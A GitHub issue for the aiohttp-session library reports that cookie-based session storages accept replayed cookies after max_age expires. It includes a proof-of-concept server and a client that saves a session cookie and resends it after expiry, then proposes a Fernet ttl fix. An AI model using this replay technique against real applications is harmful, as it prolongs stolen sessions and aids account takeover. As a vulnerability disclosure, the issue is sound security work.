| As with [#326](https://github.com/aio-libs/aiohttp-session/pull/326) the fix is retroactive. (Already created sessions will be handled properly and there is no need for secret key rotation / re-issuing). |

| I'm sorry but this makes me confused: `max_age` is used for an idle timeout before v2.7.0, but this change makes it a `hard_timeout`. More importantly, `created_time` is never updated even after resetting the content, so this means that if the web application does not recreate the session manually, the user will always get an expired session even after login again. This is a SERIOUS BREAK. |

## Description

[![@panagiks](https://avatars.githubusercontent.com/u/9973156?v=4&size=48)](/panagiks)[panagiks](https://github.com/panagiks)opened [on Oct 8, 2018](https://github.com/aio-libs/aiohttp-session/issues/325#issue-367923076)

Storages that lack inherent data expiration

* EncryptedCookieStorage
* SimpleCookieStorage (out of scope, it's inherently insecure)
* NaClCookieStorage

appear to do improper Session Expiration.

A user that has obtained a legitimate session, can do a replay attack recreating his / her cookie

(with the same value as the original) thus defeating the purpose of cookie expiry.

This impacts security in the sense that it increases the attack window for session attacks practically

providing infinite lifespan tokens.

This falls under [OWASP's OTG-SESS-007](https://www.owasp.org/index.php/Test_Session_Timeout_%28OTG-SESS-007%29) (Test Session Timeout) test and more specifically under the

'ensuring that it is not possible to “reuse” the same session' clause.

## PoC

Using a slight variation of `demo/main.py`:

```
import time
import base64
from cryptography import fernet
from aiohttp import web
from aiohttp_session import setup, get_session, new_session
from aiohttp_session.cookie_storage import EncryptedCookieStorage

async def handler(request):
    session = await get_session(request)
    now = time.time()
    created = session['created'] if not session.new else None
    text = 'Created: {}'.format(created)
    text += '\nSuccessfully used: {}'.format(now)
    if created is not None and (time.time() - created) > 10:
        text += '\nWARNING! Session used more than max_age after creation!'
    return web.Response(text=text)

async def login(request):
    session = await new_session(request)
    session['created'] = time.time()
    return web.HTTPOk()

def make_app():
    app = web.Application()
    fernet_key = fernet.Fernet.generate_key()
    secret_key = base64.urlsafe_b64decode(fernet_key)
    setup(app, EncryptedCookieStorage(secret_key, max_age=10))
    app.router.add_get('/', handler)
    app.router.add_post('/', login)
    return app

web.run_app(make_app())
```

And a client that logs in, saves the value of the cookie and re-creates it after expiry:

```
import time

import aiohttp
import asyncio

async def expiry_vuln():
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        resp = await session.post('http://127.0.0.1:8080/')
        val = resp.cookies['AIOHTTP_SESSION'].value
        print("{} cookies in Cookie Jar".format(len(session.cookie_jar)))
        await asyncio.sleep(15)
        # Make sure the cookie expired
        print("{} cookies in Cookie Jar".format(len(session.cookie_jar)))
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookies={'AIOHTTP_SESSION': val}, cookie_jar=jar) as session:
        print("{} cookies in Cookie Jar".format(len(session.cookie_jar)))
        resp = await session.get('http://127.0.0.1:8080/')
        body = await resp.text()
        print(body)

asyncio.get_event_loop().run_until_complete(expiry_vuln())
```

Running both will result in the following output on the client:

```
1 cookies in Cookie Jar
0 cookies in Cookie Jar
1 cookies in Cookie Jar
Created: xyz
Successfully used: wxy
WARNING! Session used more than max_age after creation!

```

The above shows that the expired session was successfully used simply by re-creating the cookie.

## Remedy

For fernet, [documentation](https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet.decrypt) indicates that there is a ttl option to decrypt that should suffice. I am preparing a PR for this.

Unfortunately I couldn't find anything related for NaCl. My only though on this is to add the created

time in the message itself for NaCl and check it on load\_session (maybe issue a warning if an expired

token was presented). I would like some feedback / thoughts on this.
